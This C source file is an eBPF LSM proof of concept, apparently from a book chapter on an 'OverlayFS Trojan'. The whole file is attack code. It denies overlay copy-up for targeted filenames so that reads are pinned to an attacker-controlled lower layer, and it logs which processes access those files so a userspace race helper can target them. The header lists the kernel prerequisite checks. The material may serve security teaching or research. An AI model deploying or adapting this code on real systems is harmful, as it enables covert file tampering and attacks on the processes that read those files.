// ch02 OverlayFS Trojan — REAL mutation variant using BPF LSM fmod_ret.
//
// Chapter claim: "inject payload during overlay copy-up". A full inject
// requires a userspace helper racing the copy-up window (tamper with the
// upper-dir file in the brief interval between inode_copy_up and the
// reader's vfs_read, then combine with P2 bpf_probe_write_user). This POC
// delivers the first exploit primitive: selective DENY of copy-up for
// sensitive paths, forcing the upper layer to never receive a writable
// copy and pinning reads through the (attacker-controlled) lower layer.
//
// Observation hook: lsm.s/inode_permission records access attempts on
// those paths so the attacker knows which process to target for the
// userspace race helper.
//
// Prereqs:
//   cat /sys/kernel/security/lsm      # must contain "bpf"
//   bpftool feature probe | grep lsm  # must show "lsm_fmod_ret ok"
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define PATH_MAX_COMP 64
#define EPERM 1

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    char name[PATH_MAX_COMP];
    int hook;       // 1=copy_up, 2=permission
    int denied;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// target_paths: key is a filename component (basename), e.g. "secret.txt".
// The LSM inode hooks see dentries, so basename matching is the cheapest
// reliable filter that works without a full path walk in BPF.
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, char[PATH_MAX_COMP]);
    __type(value, unsigned int);
    __uint(max_entries, 256);
} target_paths SEC(".maps");

static __always_inline int name_is_target(const char *name)
{
    char key[PATH_MAX_COMP] = {};
    // bounded copy — verifier friendly
    for (int i = 0; i < PATH_MAX_COMP - 1; i++) {
        char c = name[i];
        key[i] = c;
        if (c == 0) break;
    }
    key[PATH_MAX_COMP - 1] = 0;
    return bpf_map_lookup_elem(&target_paths, &key) != NULL;
}

static __always_inline void emit(int hook, int denied, const char *name)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return;
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->hook = hook;
    e->denied = denied;
    // bounded copy of the basename for the event
    for (int i = 0; i < PATH_MAX_COMP - 1; i++) {
        char c = name[i];
        e->name[i] = c;
        if (c == 0) break;
    }
    e->name[PATH_MAX_COMP - 1] = 0;
    bpf_ringbuf_submit(e, 0);
}

// int security_inode_copy_up(struct dentry *src, struct cred **new)
// fmod_ret: return -EPERM to deny the copy-up entirely, leaving the
// file readable only through the lower overlay layer (attacker land).
SEC("lsm/inode_copy_up")
int BPF_PROG(lsm_inode_copy_up, struct dentry *src, struct cred **new, int ret)
{
    if (ret != 0)
        return ret;

    char name[PATH_MAX_COMP] = {};
    const unsigned char *dname = BPF_CORE_READ(src, d_name.name);
    if (!dname)
        return ret;
    bpf_probe_read_kernel_str(&name, sizeof(name), dname);

    if (!name_is_target(name))
        return ret;

    emit(1, 1, name);
    return -EPERM;
}

// int security_inode_permission(struct inode *inode, int mask)
// Pure observation: record accesses to targeted names so the userspace
// racer knows when a reader is about to pull the file through the
// (attacker-controlled) lower layer.
SEC("lsm/inode_permission")
int BPF_PROG(lsm_inode_permission, struct inode *inode, int mask, int ret)
{
    (void)mask;
    struct dentry *dent = NULL;
    struct hlist_node *first = BPF_CORE_READ(inode, i_dentry.first);
    if (!first)
        return ret;
    // container_of(first, struct dentry, d_u.d_alias)
    dent = (struct dentry *)((char *)first - __builtin_offsetof(struct dentry, d_u.d_alias));

    char name[PATH_MAX_COMP] = {};
    const unsigned char *dname = BPF_CORE_READ(dent, d_name.name);
    if (!dname)
        return ret;
    bpf_probe_read_kernel_str(&name, sizeof(name), dname);

    if (!name_is_target(name))
        return ret;

    emit(2, 0, name);
    return ret;
}
